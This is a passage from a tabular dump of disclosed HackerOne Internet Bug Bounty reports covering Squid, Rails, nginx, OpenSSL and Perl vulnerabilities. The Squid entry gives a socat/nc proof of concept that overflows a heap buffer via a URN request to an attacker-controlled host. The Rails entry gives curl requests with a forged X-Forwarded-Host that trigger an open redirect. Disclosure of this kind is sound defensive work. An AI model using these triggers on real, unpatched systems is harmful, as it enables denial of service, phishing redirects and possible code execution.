Full DoS when date parsing methods are used with untrusted input",https://hackerone.com/reports/1404789,No value,No value,No value,2021,11,19,0,37
Internet Bug Bounty,1-10,1.0,No value,"$12,000.00",Critical,9.8,Classic Buffer Overflow,UrnState Heap Overflow,"jeriko_one  submitted a report to Internet Bug Bounty.Mar 19th (3 years ago)Summary:
When handling a URN Request an attacker controlled response can  cause Squid to overflow a heap buffer. The buffer exist within a struct so not only does it allow an attacker to overflow adjacent memory, but also control a pointer that follows the buffer enabling them to free arbitrary memory. Paired with the Cache Manager bypass that I reported earlier, an attacker will know which addresses are valid. This can lead to RCE and was stated in the serverity of the Squid announce. 
Squid Announce: http://www.squid-cache.org/Advisories/SQUID-2019_7.txt
Assigned CVE-2019-12526
Steps To Reproduce:
You must add the following to your squid.conf to allow URN request
Code 21 BytesWrap lines Copy Download1acl Safe_ports port 0
The squid child will crash even without Asan, but it'll automatically restart. You can check PIDs to confirm it did crash or you can build with ASan if you want to see the crash output. 
Code 105 BytesWrap lines Copy Download1$ export CFLAGS=""${CFLAGS} -fsanitize=address -g""
2$ export CXXFLAGS=""${CXXFLAGS} ${CFLAGS}""
3
4$./configure
I would also set the following ASan flags
Code 60 BytesWrap lines Copy Download1export ASAN_OPTIONS=""detect_leaks=false abort_on_error=true""
1) Start Squid
Code 32 BytesWrap lines Copy Download1./sbin/squid --foreground -d 100
1) Start a server that will output 4096 bytes
Code 76 BytesWrap lines Copy Download1$ socat TCP-LISTEN:8080,fork SYSTEM:""python -c \'print\(\\\""A\\\"" * 4096)\'""
2) Make a URN request to this server
Code 85 BytesWrap lines Copy Download1$ echo -e ""GET urn::@<attacker IP>:8080/ HTTP/1.1\r\n\r\n"" |nc <squid hostname> 3128
2
Code 7.91 KiBWrap lines Copy Download1=================================================================
2==4723==ERROR: AddressSanitizer: heap-buffer-overflow on address 0x621000067958 at pc 0x7f0d8a44deed bp 0x7ffff8eef4b0 sp 0x7ffff8eeec58
3WRITE of size 81 at 0x621000067958 thread T0
4    #0 0x7f0d8a44deec  (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec)
5    #1 0x563906dc1389 in mem_hdr::copyAvailable(mem_node*, long, unsigned long, char*) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:202
6    #2 0x563906dc1f58 in mem_hdr::copy(StoreIOBuffer const&) const /home/j1/h4x/squid/releases/squid-4.8/src/stmem.cc:262
7    #3 0x563906de76d7 in store_client::scheduleMemRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:424
8    #4 0x563906de6f0c in store_client::scheduleRead() /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:391
9    #5 0x563906de691f in store_client::doCopy(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:352
10    #6 0x563906de6082 in storeClientCopy2 /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:306
11    #7 0x563906de4ac4 in storeClientCopyEvent /home/j1/h4x/squid/releases/squid-4.8/src/store_client.cc:145
12    #8 0x563906c3cc8e in EventDialer::dial(AsyncCall&) /home/j1/h4x/squid/releases/squid-4.8/src/event.cc:41
13    #9 0x563906c3d7c6 in AsyncCallT<EventDialer>::fire() ../src/base/AsyncCall.h:145
14    #10 0x563906fd75cd in AsyncCall::make() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCall.cc:40
15    #11 0x563906fd90b5 in AsyncCallQueue::fireNext() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:56
16    #12 0x563906fd8bfc in AsyncCallQueue::fire() /home/j1/h4x/squid/releases/squid-4.8/src/base/AsyncCallQueue.cc:42
17    #13 0x563906c3e8ac in EventLoop::dispatchCalls() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:144
18    #14 0x563906c3e42e in EventLoop::runOnce() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:109
19    #15 0x563906c3e052 in EventLoop::run() /home/j1/h4x/squid/releases/squid-4.8/src/EventLoop.cc:83
20    #16 0x563906d35a0e in SquidMain(int, char**) /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1709
21    #17 0x563906d34102 in SquidMainSafe /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1417
22    #18 0x563906d3404f in main /home/j1/h4x/squid/releases/squid-4.8/src/main.cc:1405
23    #19 0x7f0d89723eaa in __libc_start_main (/lib64/libc.so.6+0x23eaa)
24    #20 0x563906ae3b59 in _start (/home/j1/h4x/squid/debug/squid-4.8/sbin/squid+0x484b59)
25
260x621000067958 is located 0 bytes to the right of 4184-byte region [0x621000066900,0x621000067958)
27allocated by thread T0 here:
28    #0 0x7f0d8a4c59ae in __interceptor_calloc (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x1179ae)
29    #1 0x563907343217 in xcalloc /home/j1/h4x/squid/releases/squid-4.8/compat/xalloc.cc:83
30    #2 0x56390731d954 in MemPoolMalloc::allocate() /home/j1/h4x/squid/releases/squid-4.8/src/mem/PoolMalloc.cc:35
31    #3 0x563907317412 in MemImplementingAllocator::alloc() /home/j1/h4x/squid/releases/squid-4.8/src/mem/Pool.cc:204
32    #4 0x563906b62af5 in cbdataInternalAlloc(int, char const*, int) /home/j1/h4x/squid/releases/squid-4.8/src/cbdata.cc:238
33    #5 0x563906e36d1c in UrnState::operator new(unsigned long) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:32
34    #6 0x563906e344c1 in urnStart(HttpRequest*, StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/urn.cc:211
35    #7 0x563906c609cb in FwdState::Start(RefCount<Comm::Connection> const&, StoreEntry*, HttpRequest*, RefCount<AccessLogEntry> const&) /home/j1/h4x/squid/releases/squid-4.8/src/FwdState.cc:373
36    #8 0x563906bac622 in clientReplyContext::processMiss() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:783
37    #9 0x563906bb947e in clientReplyContext::doGetMoreData() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1855
38    #10 0x563906bb76d1 in clientReplyContext::identifyFoundObject(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1707
39    #11 0x563906bae43c in clientReplyContext::created(StoreEntry*) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:937
40    #12 0x563906dc96e7 in StoreEntry::getPublicByRequest(StoreClient*, HttpRequest*) /home/j1/h4x/squid/releases/squid-4.8/src/store.cc:524
41    #13 0x563906bb716e in clientReplyContext::identifyStoreObject() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1667
42    #14 0x563906bb8cab in clientGetMoreData /home/j1/h4x/squid/releases/squid-4.8/src/client_side_reply.cc:1813
43    #15 0x563906bead08 in clientStreamRead(clientStreamNode*, ClientHttpRequest*, StoreIOBuffer) /home/j1/h4x/squid/releases/squid-4.8/src/clientStream.cc:182
44    #16 0x563906bd20c6 in ClientHttpRequest::httpStart() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1542
45    #17 0x563906bd1c94 in ClientHttpRequest::processRequest() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1528
46    #18 0x563906bd528d in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1896
47    #19 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
48    #20 0x563906bcacf5 in ClientRequestContext::clientAccessCheck2() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:729
49    #21 0x563906bd383f in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1781
50    #22 0x563906bcc18a in ClientRequestContext::clientAccessCheckDone(allow_t const&) /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:830
51    #23 0x563906bcae38 in clientAccessCheckDoneWrapper /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:741
52    #24 0x563906f171b9 in ACLChecklist::checkCallback(allow_t) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:169
53    #25 0x563906f15b23 in ACLChecklist::completeNonBlocking() /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:54
54    #26 0x563906f17c5b in ACLChecklist::nonBlockingCheck(void (*)(allow_t, void*), void*) /home/j1/h4x/squid/releases/squid-4.8/src/acl/Checklist.cc:257
55    #27 0x563906bca91a in ClientRequestContext::clientAccessCheck() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:709
56    #28 0x563906bd3255 in ClientHttpRequest::doCallouts() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:1753
57    #29 0x563906bc87b9 in ClientRequestContext::hostHeaderVerify() /home/j1/h4x/squid/releases/squid-4.8/src/client_side_request.cc:600
58
59SUMMARY: AddressSanitizer: heap-buffer-overflow (/usr/lib/gcc/x86_64-pc-linux-gnu/9.2.0/libasan.so.5+0x9feec) 
60Shadow bytes around the buggy address:
61  0x0c4280004ed0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
62  0x0c4280004ee0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
63  0x0c4280004ef0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
64  0x0c4280004f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
65  0x0c4280004f10: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
66=>0x0c4280004f20: 00 00 00 00 00 00 00 00 00 00 00[fa]fa fa fa fa
67  0x0c4280004f30: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
68  0x0c4280004f40: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
69  0x0c4280004f50: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
70  0x0c4280004f60: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
71  0x0c4280004f70: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa
72Shadow byte legend (one shadow byte represents 8 application bytes):
73  Addressable:           00
74  Partially addressable: 01 02 03 04 05 06 07 
75  Heap left redzone:       fa
76  Freed heap region:       fd
77  Stack left redzone:      f1
78  Stack mid redzone:       f2
79  Stack right redzone:     f3
80  Stack after return:      f5
81  Stack use after scope:   f8
82  Global redzone:          f9
83  Global init order:       f6
84  Poisoned by user:        f7
85  Container overflow:      fc
86  Array cookie:            ac
87  Intra object redzone:    bb
88  ASan internal:           fe
89  Left alloca redzone:     ca
90  Right alloca redzone:    cb
91  Shadow gap:              cc
92==4723==ABORTING
Analysis
When handling an URN request from a user Squid makes a request to the remote
server to retrieve a list of URLs. The response is handled via urnHandleReply.
The response from the server is buffered into urnState->reqbuf as Squid reads
data in. This buffer is of length URN_REQBUF_SZ 4096
urnHandleReply can be called into multiple times as it waits for
urlres_e->store_status != STORE_PENDING and the current offset into reqbuf
held by urnState->reqofs is less than URN_REQBUF_SZ.
Code 431 BytesWrap lines Copy Download1    if (urlres_e->store_status == STORE_PENDING &&
2            urnState->reqofs < URN_REQBUF_SZ) {
3        tempBuffer.offset = urnState->reqofs;
4        tempBuffer.length = URN_REQBUF_SZ;
5        tempBuffer.data = urnState->reqbuf + urnState->reqofs;
6        storeClientCopy(urnState->sc, urlres_e,
7                        tempBuffer,
8                        urnHandleReply,
9                        urnState);
10        return;
11    }
urnHandleReply will prepare a StoreIOBuffer object filling it with urnState
buffer, reqofs, and how the length.
Unfortunately this tempBuffer has the total length of urnState->reqbuf
URN_REQBUF_SZ, instead of the amount of data that is left. Whenever the
response is being copied a second time into the buffer it can overflow. The
attacker can control how much is overflowed by adjusting the response.
Impact
This overflow has 2 useful features for someone trying to exploit Squid. The
first obvious one being overflowing into an adjacent memory region. An
attacker that was able to align the heap in such a way that a virtual table
pointer was after the urnState object could gain control of the instructor
pointer, thus, gaining control of the Squid process.
The second is that before urnState overflows into that adjacent object it will
overflow the pointer urlres within itself. This pointer later is free'd. An
attacker with knowledge of current addresses in Squid could use this to
trigger a Use-After-Free.celt   changed the status to Triaged. Mar 19th (3 years ago)Hello @jeriko_one,
Thank you for your submission! We were able to validate your report, and have submitted it to the appropriate remediation team for review. They will let us know the final ruling on this report, and when/if a fix will be implemented. Please note that the status and severity are subject to change.
Regards,
@celtkunderkoffler HackerOne staff  updated CVE reference to CVE-2019-12526. Jul 27th (about 1 year ago)Internet Bug Bounty  rewarded jeriko_one with a $12,000 bounty. Jul 27th (about 1 year ago)Hi @jeriko_one,
Thank you for your patience and your contribution to making the internet safer!
Happy hacking!
kunderkoffler HackerOne staff  updated the severity from high (8.8) to critical (9.8). Jul 27th (about 1 year ago)kunderkoffler HackerOne staff  closed the report and changed the status to Resolved. Jul 27th (about 1 year ago)kunderkoffler HackerOne staff  requested to disclose this report. Jul 27th (about 1 year ago)  This report has been disclosed. Aug 26th (about 1 year ago)",https://hackerone.com/reports/824771,No value,No value,No value,2020,3,19,17,10
Internet Bug Bounty,1-10,1.0,No value,"$1,200.00",Medium,5.45,Open Redirect,The Host Authorization middleware in Action Pack is vulnerable to crafted X-Forwarded-Host values,"mshtawythug  submitted a report to Internet Bug Bounty.Oct 19th (about 1 year ago)Title:         The Host Authorization middleware in Action Pack is vulnerable to crafted X-Forwarded-Host values
Scope:         https://github.com/rails/rails
Weakness:      Open Redirect
Severity:      Medium
Link:          https://hackerone.com/reports/1189310
Date:          2021-05-09 06:29:19 +0000
By:            @mshtawy
CVE IDs:       CVE-2021-22942, CVE-2021-22881
Details:
### Steps to reproduce
This is a follow up to  CVE-2021-22881 and  https://github.com/rails/rails/commit/83a6ac3fee8fd538ce7e0088913ff54f0f9bcb6f
with a controller like the following
Code 121 BytesWrap lines Copy Download1class TestsController < ApplicationController
2  extend ActiveSupport::Concern
3
4  def index
5    redirect_to('/')
6  end
7end
when sending a request like the following where the URL has a mixed case characters 
Code 66 BytesWrap lines Copy Download1curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: Evil.com'
Or all capital case 
Code 66 BytesWrap lines Copy Download1curl 'http://localhost:3000/tests' -H 'X-Forwarded-Host: EVIL.COM'
Expected behavior
Code 168 BytesWrap lines Copy Download1<div id=""container"">
2  <h2>To allow requests to evil.com, add the following to your environment configuration:</h2>
3  <pre>config.hosts &lt;&lt; ""Evil.com""</pre>
4</div>
Actual behavior
Code 84 BytesWrap lines Copy Download1<html><body>You are being <a href=""http://Evil.com/"">redirected</a>.</body></html>% 
System configuration
Rails version:
Tested on Rails 6.1.3.1 and Rails 6.1.3.2
Ruby version:
N/A
Notes
This was fixed in main in this PR https://github.com/rails/rails/pull/41435 but still affects <= 6.1.3.1 
The problem is in this code https://github.com/rails/rails/blob/6-1-stable/actionpack/lib/action_dispatch/middleware/host_authorization.rb#L115
Code 167 BytesWrap lines Copy Download1origin_host = valid_host.match(
2  request.get_header(""HTTP_HOST"").to_s.downcase)
3forwarded_host = valid_host.match(
4  request.x_forwarded_host.to_s.split(/,\s?/).last)
forwarded_host is missing a downcase after the .to_s, which results in nil assigned to forwarded_host, which then results in true in the following  code
Code 127 BytesWrap lines Copy Download1origin_host && @permissions.allows?(origin_host[:host]) && (forwarded_host.nil? || @permissions.allows?(forwarded_host[:host]))
because of the nil? check on the forwarded_host
Code 66 BytesWrap lines Copy Download1forwarded_host.nil? || @permissions.allows?(forwarded_host[:host])
The examples I gave are using localhost, but I also confirmed this using a production environment with a configuration like the following
Code 53 BytesWrap lines Copy Download1    Rails.application.config.hosts = %w(.EXAMPLE.com)
Impact
Hackers can redirect victims to a malicious website.
Timeline:
2021-08-03 20:27:55 +0000: @tenderlove (bug triaged)

2021-09-07 20:30:35 +0000: @tenderlove (cve id added)

2021-10-05 20:37:19 +0000: @tenderlove (bug resolved)
Impact
Hackers can redirect victims to a malicious website.mshtawythug   posted a comment. Oct 19th (about 1 year ago)I assigned the wrong type of weakness it should be CWE-601Internet Bug Bounty  rewarded mshtawythug with a $1,200 bounty. Oct 19th (about 1 year ago)Thank you for your contribution to making the Internet safer!
This bounty was awarded with a 80/20% split. An additional $300 will be paid to the project.kunderkoffler HackerOne staff  added weakness ""Open Redirect"" and removed weakness ""Improper Neutralization of HTTP Headers for Scripting Syntax"". Oct 19th (about 1 year ago)kunderkoffler HackerOne staff  updated CVE reference to CVE-2021-22942. Oct 19th (about 1 year ago)kunderkoffler HackerOne staff  closed the report and changed the status to Resolved. Oct 19th (about 1 year ago)kunderkoffler HackerOne staff  requested to disclose this report. Oct 19th (about 1 year ago)mshtawythug   posted a comment. Oct 22nd (about 1 year ago)@kunderkoffler thanks  This report has been disclosed. Nov 18th (about 1 year ago)",https://hackerone.com/reports/1374512,No value,No value,No value,2021,10,19,18,33
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,None,SPDY memory corruption,"lmolas  submitted a report to Internet Bug Bounty.Mar 24th (9 years ago)A bug in the experimental SPDY implementation in nginx 1.5.10 was found, which might allow an attacker to corrupt worker process memory by using a specially crafted request, potentially resulting in arbitrary code execution (CVE-2014-0088).
The problem only affects nginx 1.5.10 on 32-bit platforms, compiled with the ngx_http_spdy_module module (which is not compiled by default), if the ""spdy"" option of the ""listen"" directive is used in a configuration file.
The problem is fixed in nginx 1.5.11.
Patch for the problem can be found here:
http://nginx.org/download/patch.2014.spdy.txt
Thanks to Lucas Molas, researcher at Programa STIC, Fundación Dr. Manuel Sadosky, Buenos Aires, Argentina.Internet Bug Bounty  rewarded lmolas with a $3,000 bounty. Mar 24th (9 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/4689,No value,No value,No value,2014,3,24,21,54
Internet Bug Bounty,1-10,1.0,No value,"$3,000.00",No value,0.0,None,SPDY heap buffer overflow,"lmolas  submitted a report to Internet Bug Bounty.Mar 24th (9 years ago)A bug in the experimental SPDY implementation in nginx was found, which might allow an attacker to cause a heap memory buffer overflow in a worker process by using a specially crafted request, potentially resulting in arbitrary code execution (CVE-2014-0133).
The problem affects nginx 1.3.15 - 1.5.11, compiled with the ngx_http_spdy_module module (which is not compiled by default) and without --with-debug configure option, if the ""spdy"" option of the ""listen"" directive is used in a configuration file.
The problem is fixed in nginx 1.5.12, 1.4.7.
Patch for the problem can be found here:
http://nginx.org/download/patch.2014.spdy2.txt
Thanks to Lucas Molas, researcher at Programa STIC, Fundación Dr. Manuel Sadosky, Buenos Aires, Argentina.Internet Bug Bounty  rewarded lmolas with a $3,000 bounty. Mar 24th (9 years ago)  closed the report and changed the status to Resolved. Updated Sep 15th (6 years ago)",https://hackerone.com/reports/4690,No value,No value,No value,2014,3,24,21,54
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Denial of Service,ASN.1 BIO excessive memory allocation (CVE-2016-2109),"geeknik  submitted a report to Internet Bug Bounty.Apr 26th (7 years ago)On 4 April 2016 I reported a bug to the OpenSSL Security Team where I was able to force OpenSSL to use large amounts of cpu time, memory and swap space. They confirmed receipt on 6 April 2016 and on 22 April 2016 I was notified that they were assigning CVE-2016-2109 to this flaw and the fix was committed to git on 22 April 2016. 
Code 963 BytesWrap lines Copy Download1The main cause is the way asn1_d2i_read_bio works: it allocates memory depending on the length field. Your test cases looks like this:
2
330 84 30 30 30 30 30
4
5Which translates to a SEQUENCE with a length of 0x30303030 which explains the huge memory requirements.
6
7In some cases this is intended (for example large CMS messages) so we can't just reject these. Additionally because the input comes from a BIO we may not know the actual length of the data (e.g. from a pipe) so we can't immediately determine if there isn't enough data to read. We can however read the input in
8smaller chunks and determine if there is an unexpected EOF. That would mean that you couldn't have a tiny file allocate huge amounts of memory. We currently have a patch being reviewed that does this: that would reject your test case instead of allocating lots of memory.
9
10If you're calling the memory based ASN.1 decoders this shouldn't happen because they can sanity check length fields.
Fixed in master:
https://git.openssl.org/?p=openssl.git;a=commit;h=c62981390d6cf9e3d612c489b8b77c2913b25807",https://hackerone.com/reports/134880,No value,No value,No value,2016,4,26,22,31
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",No value,0.0,Cryptographic Issues - Generic,Bleichenbacher oracle in SSLv2 (CVE-2016-0704),"dadrian  submitted a report to Internet Bug Bounty.May 12th (7 years ago)I'm retroactively submitting CVE-2016-0704, a.k.a. ""Leaky Export"", which is a Bleichenbacher-style bug that leads to another variant of the Special DROWN attack. I'm submitting on behalf of myself and J. Alex Halderman, as we independently found this bug. This was validated by OpenSSL as Sev:Moderate at https://www.openssl.org/news/secadv/20160301.txt.
See https://drownattack.com for more information.",https://hackerone.com/reports/138181,No value,No value,No value,2016,5,12,5,56
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Out-of-bounds Read,Certificate message OOB reads (CVE-2016-6306),"theyarestone  submitted a report to Internet Bug Bounty.Apr 18th (6 years ago)In OpenSSL 1.0.2 and earlier some missing message length checks can result in
OOB reads of up to 2 bytes beyond an allocated buffer. There is a theoretical
DoS risk but this has not been observed in practice on common platforms.
The messages affected are client certificate, client certificate request and
server certificate. As a result the attack can only be performed against
a client or a server which enables client authentication.
refer:
https://www.openssl.org/news/secadv/20160922.txt",https://hackerone.com/reports/221790,No value,No value,No value,2017,4,18,7,39
Internet Bug Bounty,1-10,1.0,No value,"$2,500.00",No value,0.0,Cryptographic Issues - Generic,Cross-protocol attack on TLS using SSLv2 (DROWN) (CVE-2016-0800),"nimia  submitted a report to Internet Bug Bounty.Sep 7th (6 years ago)General DROWN was responsibly disclosed to the OpenSSL team prior to the public disclosure.
This OpenSSL blog post, by Viktor Dukhovni and Emilia Käsper, describes the vulnerability:
https://www.openssl.org/blog/blog/2016/03/01/an-openssl-users-guide-to-drown/
This is probably a good opportunity to again thank everyone who helped with the disclosure process :-)",https://hackerone.com/reports/166629,No value,No value,No value,2016,9,7,17,34
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Denial of Service,Client DoS due to large DH parameter (CVE-2018-0732),"guido  submitted a report to Internet Bug Bounty.Jun 12th (4 years ago)https://www.openssl.org/news/secadv/20180612.txt
Code 976 BytesWrap lines Copy Download1OpenSSL Security Advisory [12 June 2018]
2========================================
3
4Client DoS due to large DH parameter (CVE-2018-0732)
5====================================================
6
7Severity: Low
8
9During key agreement in a TLS handshake using a DH(E) based ciphersuite a
10malicious server can send a very large prime value to the client. This will
11cause the client to spend an unreasonably long period of time generating a key
12for this prime resulting in a hang until the client has finished. This could be
13exploited in a Denial Of Service attack.
14
15Due to the low severity of this issue we are not issuing a new release of
16OpenSSL 1.1.0 or 1.0.2 at this time. The fix will be included in OpenSSL 1.1.0i
17and OpenSSL 1.0.2p when they become available. The fix is also available in
18commit ea7abeeab (for 1.1.0) and commit 3984ef0b7 (for 1.0.2) in the OpenSSL git
19repository.
20
21This issue was reported to OpenSSL on 5th June 2018 by Guido Vranken who also
22developed the fix.
Impact
Client DoSInternet Bug Bounty  rewarded guido with a $500 bounty. Sep 20th (4 years ago)reed   closed the report and changed the status to Resolved. Sep 20th (4 years ago)reed   requested to disclose this report. Sep 20th (4 years ago)guido   agreed to disclose this report. Sep 20th (4 years ago)Thanks.  This report has been disclosed. Sep 20th (4 years ago)",https://hackerone.com/reports/364964,No value,No value,No value,2018,6,12,11,15
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,EBCDIC overread (CVE-2016-2176),guido  submitted a report to Internet Bug Bounty.May 3rd (7 years ago)https://github.com/openssl/openssl/commit/ea96ad5a206b7b5f25dad230333e8ff032df3219,https://hackerone.com/reports/135946,No value,No value,No value,2016,5,3,11,42
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,EVP_EncodeUpdate overflow (CVE-2016-2105),guido  submitted a report to Internet Bug Bounty.May 3rd (7 years ago)https://github.com/openssl/openssl/commit/ee1e3cac2e83abc77bcc8ff98729ca1e10fcc920arice HackerOne staff  changed the report title from CVE-2016-2105: overflow in EVP_EncodeUpdate (severity: LOW) to EVP_EncodeUpdate overflow (CVE-2016-2105). May 3rd (7 years ago)Internet Bug Bounty  rewarded guido with a $500 bounty. May 3rd (7 years ago)arice HackerOne staff  closed the report and changed the status to Resolved. May 3rd (7 years ago)arice HackerOne staff  requested to disclose this report. May 3rd (7 years ago)guido   agreed to disclose this report. May 3rd (7 years ago)  This report has been disclosed. May 3rd (7 years ago),https://hackerone.com/reports/135944,No value,No value,No value,2016,5,3,11,41
Internet Bug Bounty,1-10,1.0,No value,$500.00,Low,2.0,Denial of Service,Excessive allocation of memory in dtls1_preprocess_fragment() (CVE-2016-6308),"theyarestone  submitted a report to Internet Bug Bounty.Apr 18th (6 years ago)This issue is very similar to CVE-2016-6307. The underlying defect is different
but the security analysis and impacts are the same except that it impacts DTLS.
A DTLS message includes 3 bytes for its length in the header for the message.
This would allow for messages up to 16Mb in length. Messages of this length are
excessive and OpenSSL includes a check to ensure that a peer is sending
reasonably sized messages in order to avoid too much memory being consumed to
service a connection. A flaw in the logic of version 1.1.0 means that memory for
the message is allocated too early, prior to the excessive message length
check. Due to way memory is allocated in OpenSSL this could mean an attacker
could force up to 21Mb to be allocated to service a connection. This could lead
to a Denial of Service through memory exhaustion. However, the excessive message
length check still takes place, and this would cause the connection to
immediately fail. Assuming that the application calls SSL_free() on the failed
conneciton in a timely manner then the 21Mb of allocated memory will then be
immediately freed again. Therefore the excessive memory allocation will be
transitory in nature. This then means that there is only a security impact if:
1) The application does not call SSL_free() in a timely manner in the
event that the connection fails
or
2) The application is working in a constrained environment where there
is very little free memory
or
3) The attacker initiates multiple connection attempts such that there
are multiple connections in a state where memory has been allocated for
the connection; SSL_free() has not yet been called; and there is
insufficient memory to service the multiple requests.
Except in the instance of (1) above any Denial Of Service is likely to
be transitory because as soon as the connection fails the memory is
subsequently freed again in the SSL_free() call. However there is an
increased risk during this period of application crashes due to the lack
of memory - which would then mean a more serious Denial of Service.
This issue does not affect TLS users.
refer:
https://www.openssl.org/news/secadv/20160922.txt",https://hackerone.com/reports/221792,No value,No value,No value,2017,4,18,7,42
Internet Bug Bounty,1-10,1.0,No value,$500.00,No value,0.0,Memory Corruption - Generic,EVP_EncryptUpdate overflow (CVE-2016-2106),guido  submitted a report to Internet Bug Bounty.May 3rd (7 years ago)https://github.com/openssl/openssl/commit/3f3582139fbb259a1c3cbb0a25236500a409bf26,https://hackerone.com/reports/135945,No value,No value,No value,2016,5,3,11,41
Internet Bug Bounty,1-10,1.0,No value,"$1,000.00",Medium,5.45,Buffer Underflow,[CVE-2018-6913] heap-buffer-overflow in S_pack_rec,"karas  submitted a report to Internet Bug Bounty.May 20th (5 years ago)pack() may cause a heap buffer write overflow with a large item count.

Reported to the Perl security mailing list on 5 Aug 2017.
Confirmed as a security flaw by TonyC on 30 Jan 2018
CVE-2018-6913 assigned to this flaw on 11 Feb 2018
Public security advisory released on 14 April 2018

Code 2.84 KiBWrap lines Copy Download1=================================================================
2==2895==ERROR: AddressSanitizer: heap-buffer-overflow on address 0xb610081c at pc 0x08a72387 bp 0xbfea6038 sp 0xbfea602c
3WRITE of size 4 at 0xb610081c thread T0
4    #0 0x8a72386 in S_pack_rec /root/karas/perl5-blead/pp_pack.c:2703:17
5    #1 0x8a42706 in Perl_packlist /root/karas/perl5-blead/pp_pack.c:1980:11
6    #2 0x8a73626 in Perl_pp_pack /root/karas/perl5-blead/pp_pack.c:3135:5
7    #3 0x84dc7ac in Perl_runops_debug /root/karas/perl5-blead/dump.c:2465:23
8    #4 0x818858a in S_fold_constants /root/karas/perl5-blead/op.c:4557:2
9    #5 0x8186c5a in Perl_op_convert_list /root/karas/perl5-blead/op.c:4896:12
10    #6 0x8363e7e in Perl_yyparse /root/karas/perl5-blead/perly.y:889:23
11    #7 0x8232350 in S_parse_body /root/karas/perl5-blead/perl.c:2401:9
12    #8 0x82285e3 in perl_parse /root/karas/perl5-blead/perl.c:1719:2
13    #9 0x81494a6 in main /root/karas/perl5-blead/perlmain.c:121:18
14    #10 0xb74d5636 in __libc_start_main /build/glibc-KM3i_a/glibc-2.23/csu/../csu/libc-start.c:291
15    #11 0x8075847 in _start (/root/karas/perl5-blead/perl+0x8075847)
16
170xb610081c is located 2 bytes to the right of 10-byte region [0xb6100810,0xb610081a)
18allocated by thread T0 here:
19    #0 0x8119b84 in malloc (/root/karas/perl5-blead/perl+0x8119b84)
20    #1 0x84e2987 in Perl_safesysmalloc /root/karas/perl5-blead/util.c:153:21
21
22SUMMARY: AddressSanitizer: heap-buffer-overflow /root/karas/perl5-blead/pp_pack.c:2703:17 in S_pack_rec
23Shadow bytes around the buggy address:
24  0x36c200b0: fa fa fd fd fa fa fd fd fa fa fd fd fa fa 00 04
25  0x36c200c0: fa fa fd fd fa fa 00 04 fa fa 00 04 fa fa 00 04
26  0x36c200d0: fa fa 00 04 fa fa 00 04 fa fa 00 04 fa fa 00 04
27  0x36c200e0: fa fa 00 04 fa fa 00 04 fa fa 00 04 fa fa 00 04
28  0x36c200f0: fa fa fd fa fa fa fd fd fa fa 00 02 fa fa 01 fa
29=>0x36c20100: fa fa 00[02]fa fa 00 02 fa fa fd fd fa fa 00 04
30  0x36c20110: fa fa 02 fa fa fa 00 02 fa fa 07 fa fa fa 00 02
31  0x36c20120: fa fa 00 02 fa fa 00 00 fa fa 00 05 fa fa 00 01
32  0x36c20130: fa fa 00 07 fa fa 00 fa fa fa 00 02 fa fa 05 fa
33  0x36c20140: fa fa 00 02 fa fa 06 fa fa fa 00 02 fa fa 05 fa
34  0x36c20150: fa fa 00 05 fa fa 04 fa fa fa 05 fa fa fa 05 fa
35Shadow byte legend (one shadow byte represents 8 application bytes):
